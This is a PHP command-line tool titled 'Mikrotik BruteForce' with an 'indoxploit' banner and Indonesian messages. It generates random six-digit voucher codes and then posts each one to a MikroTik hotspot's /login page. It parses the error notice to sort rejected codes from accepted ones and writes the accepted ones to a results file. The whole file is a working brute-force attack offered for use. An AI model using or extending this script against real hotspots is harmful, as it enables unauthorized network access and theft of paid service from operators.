<?php 

 	set_time_limit(0);
  	error_reporting(0);
  	date_default_timezone_set('Asia/Jakarta');
	system('clear');


/* START COLOR */
$res="\033[0m";
$hitam="\033[0;30m";
$abu2="\033[1;30m";
$putih="\033[0;37m";
$putih2="\033[1;37m";
$red="\033[0;31m";
$red2="\033[1;31m";
$green="\033[0;32m";
$green2="\033[1;32m";
$yellow="\033[0;33m";
$yellow2="\033[1;33m";
$blue="\033[0;34m";
$blue2="\033[1;34m";
$purple="\033[0;35m";
$purple2="\033[1;35m";
$lblue="\033[0;36m";
$lblue2="\033[1;36m";
/* END COLOR */

$false = "{$abu2}[{$red}x{$abu2}]{$red2}";
$true = "{$abu2}[{$green}+{$abu2}]{$green2}";
$pentung = "{$abu2}[{$yellow}!{$abu2}]{$yellow2}";
$titik = "{$abu2}[{$res}•{$abu2}]{$green2}";

function random($length = 6) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function  login($ip, $post ,$red, $green2, $putih, $lblue2){

$url = $ip."/login";
$payload = "username=".$post."&password=d31bf183bdf6b6d142d3279825d66637&dst=&popup=true";
$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_POSTFIELDS, $payload );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
$result = curl_exec($ch);
curl_close($ch);
$result = explode('<div class="notice">kode voucher/user', $result);
$result = explode('sesuai, masukkan kembali dengan benar.</div>', $result[1]);
// echo $result[0];
if (preg_match('/tidak/i', $result[0])) {
	echo "{$red} [ {$putih}- {$red}]{$putih} [ {$putih}".$result[0]." {$putih}]{$lblue2} | {$putih}".$post." {$red} C0d3 Failed!!\n";
}else{
	echo "{$green2} [ {$putih}+ {$green2}]{$putih} [ {$putih}".$result[0]." {$putih}]{$lblue2} | {$putih}".$post." {$green2} C0d3 Valid!!\n";
	mkdir("Result");
	$date = "Result/Voucher Valid".date('d F Y');
	$fopen = fopen($date.'.txt', 'a');
	fwrite($fopen, $result[0]);
}

};
echo "{$green2} 	___________________________
	< root@indoxploit:~# KM37ID >
	 ---------------------------
	   \         ,        ,
	    \       /(        )`
	     \      \ \___   / |
	            /- _  `-/  '
	           (/\/ \ \   /\
	           / /   | `    \
	           O O   ) /    |
	           `-^--'`<     '
	          (_.)  _  )   /
	           `.___/`    /
	             `-----' /
	<----.     __ / __   \
	<----|====O)))==) \) /====>
	<----'    `--' `.__,' \
	             |        |
	              \       /
	        ______( (_  / \______
	      ,'  ,-----'   |        \
	      `--{__________)        \/
";
echo "\n{$lblue2}  [ {$putih}#{$lblue2} ]{$putih} Tool/by: Mikrotik BruteForce/KM37ID\n\n";
echo "{$lblue2}[ {$putih}1 {$lblue2}] {$putih}Generate List
{$lblue2}[ {$putih}2 {$lblue2}] {$putih}BruteForce Attack\n";
$key = readline("[ ? ] root@indoxploit:~# ");
if ($key == 1) {
	$genjum = readline("[ # ] Line : ");
	$i = 0;
	while ($i <= $genjum) {

	$genlist = random($length = 6);
	$fopengen = fopen('list.txt', 'a');
	fwrite($fopengen, $genlist."\n");
	$i++;
	}
	echo "{$green2}[ {$putih}+ {$green2}] {$putih}C0d3 berhasil di Buat nama File {$lblue2}list.txt!!{$putih}\n";
}else{
echo "\n";
$ip = readline(" [ ? ] IP Address: ");
$file_domain = file_get_contents("list.txt");
	echo "\n{$lblue2} [ # ]{$putih} IP Address: $ip";
	echo "\n{$lblue2} [ # ]{$putih} Response {$lblue2} | {$putih} Voucher {$lblue2} [ # ]";
	for ($n=0; $n <= 9999999 ; $n++) { 

		$exp_domain = explode("\n", $file_domain);
		$lop_domain = $exp_domain[$n];
		if($lop_domain == null)break;
		$min = array($lop_domain);
		foreach ($min as $post) {
		login($ip, $post ,$red, $green2, $putih, $lblue2);

		}


	}

}
 ?>
